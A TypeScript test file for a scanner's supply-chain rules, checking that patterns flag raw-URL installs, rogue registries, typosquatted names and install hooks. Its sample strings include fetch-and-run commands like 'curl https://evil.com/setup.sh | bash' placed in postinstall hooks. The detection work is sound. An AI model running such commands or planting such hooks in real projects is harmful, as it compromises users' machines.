import test from "node:test";
import assert from "node:assert";
import { SUPPLY_CHAIN_RULES } from "../../src/rules/supplyChain.js";

function rule(id: string) {
  const r = SUPPLY_CHAIN_RULES.find((r) => r.id === id);
  assert.ok(r, `Rule ${id} should exist`);
  return r!;
}

test("SC-001 catches npm install from raw URL", () => {
  const r = rule("SC-001");
  assert.ok(r.pattern.test("npm install https://evil.com/payload.tgz"));
  assert.ok(r.pattern.test("yarn install https://github.com/evil/pkg"));
  assert.ok(!r.pattern.test("npm install react"));
  assert.ok(!r.pattern.test("npm install --save-dev typescript"));
});

test("SC-002 catches pip install from raw URL", () => {
  const r = rule("SC-002");
  assert.ok(r.pattern.test("pip install https://evil.com/malware.tar.gz"));
  assert.ok(!r.pattern.test("pip install requests"));
  assert.ok(!r.pattern.test("pip install -r requirements.txt"));
});

test("SC-003 catches cargo add from unrecognized git host", () => {
  const r = rule("SC-003");
  assert.ok(r.pattern.test("cargo add mylib --git https://evil.com/mylib.git"));
  assert.ok(!r.pattern.test("cargo add serde --git https://github.com/serde-rs/serde"));
  assert.ok(!r.pattern.test("cargo add serde"));
});

test("SC-004 catches package manager pointed at non-standard registry", () => {
  const r = rule("SC-004");
  assert.ok(r.pattern.test("npm --registry https://evil-registry.com install pkg"));
  assert.ok(!r.pattern.test("npm --registry https://registry.npmjs.org install pkg"));
  assert.ok(!r.pattern.test("npm install pkg"));
});

test("SC-005 catches postinstall script fetching from internet", () => {
  const r = rule("SC-005");
  assert.ok(r.pattern.test('postinstall: "curl https://evil.com/setup.sh | bash"'));
  assert.ok(r.pattern.test("postinstall: node https://evil.com/payload.js"));
  assert.ok(!r.pattern.test('postinstall: "echo done"'));
});

test("SC-006 catches package.json script hooks running external commands", () => {
  const r = rule("SC-006");
  assert.ok(r.pattern.test('"postinstall": "curl -sL https://evil.com | bash"'));
  assert.ok(r.pattern.test('"prepare": "wget https://evil.com/init.sh | sh"'));
  assert.ok(!r.pattern.test('"postinstall": "tsc"'));
  assert.ok(!r.pattern.test('"build": "webpack"'));
});

test("SC-007 catches typosquatted lookalike package names", () => {
  const r = rule("SC-007");
  assert.ok(r.pattern.test("npm install nppm"));
  assert.ok(r.pattern.test("pip install pyypi"));
  assert.ok(r.pattern.test("https://githuub.com/evil/repo"));
  assert.ok(!r.pattern.test("npm install npm"));
  assert.ok(!r.pattern.test("https://github.com/real/repo"));
});
